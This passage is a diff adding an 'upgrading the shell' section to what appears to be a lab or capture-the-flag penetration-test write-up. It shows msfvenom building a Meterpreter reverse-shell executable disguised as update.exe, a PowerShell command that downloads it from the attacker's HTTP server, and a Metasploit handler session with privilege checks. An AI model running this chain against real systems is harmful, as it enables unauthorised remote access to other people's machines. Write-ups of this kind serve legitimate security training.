@@ -529,6 +529,147 @@ PS C:\xampp\htdocs>
 
 ```
 
+### upgrading the shell
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.80 LPORT=4445 -f exe -o update.exe 
+python3 -m http.server 8001
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7680 bytes
+Saved as: update.exe
+Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
+10.129.234.67 - - [27/Sep/2026 09:13:37] "GET /update.exe HTTP/1.1" 200 -
+10.129.234.67 - - [27/Sep/2026 09:15:19] "GET /update.exe HTTP/1.1" 200 
+```
+
+```
+PS C:\tmp> powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.15.80:8001/update.exe','C:\tmp\update.exe')"
+PS C:\tmp> dir
+
+
+    Directory: C:\tmp
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         9/27/2026   6:15 AM           7680 update.exe                                                           
+
+
+PS C:\tmp> .\update.exe
+PS C:\tmp> 
+
+```
+
+```
+ msfconsole -q          
+msf > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) > dir
+[*] exec: dir
+
+CVE-2024-4577-PHP-RCE  enox.hash  ntlm_theft  update.exe
+msf exploit(multi/handler) > options
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(multi/handler) > set lhost tun0
+lhost => 10.10.15.80
+msf exploit(multi/handler) > set lport 4446
+lport => 4446
+msf exploit(multi/handler) > set lport 4445
+lport => 4445
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.10.15.80:4445 
+[*] Sending stage (230982 bytes) to 10.129.234.67
+[*] Meterpreter session 1 opened (10.10.15.80:4445 -> 10.129.234.67:52867) at 2026-09-27 09:16:38 -0400
+
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: 1346 The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+[-] Named Pipe Impersonation (RPCSS variant)
+[-] Named Pipe Impersonation (PrintSpooler variant)
+[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
+meterpreter > shell
+Process 2604 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.20348.4052]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\tmp>cd c:\ 
+cd c:\
+
+c:\>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name                  SID     
+========================== ========
+nt authority\local service S-1-5-19
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID                                                                                              Attributes                                        
+====================================== ================ ================================================================================================ ==================================================
+Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                                                                                       
+Everyone                               Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                                                          Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                          Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
+LOCAL                                  Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-1488445330-856673777-1515413738-1380768593-2977925950-2228326386-886087428-2802422674   Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263 Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-3523901360-1745872541-794127107-675934034-1867954868-1951917511-1111796624-2052600462   Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State   
+============================= =================================== ========
+SeTcbPrivilege                Act as part of the operating system Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
+SeCreateGlobalPrivilege       Create global objects               Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
+SeTimeZonePrivilege           Change the time zone                Disabled
+
+
+c:\>
+
+```
+
 ---
 ## Remediation
 
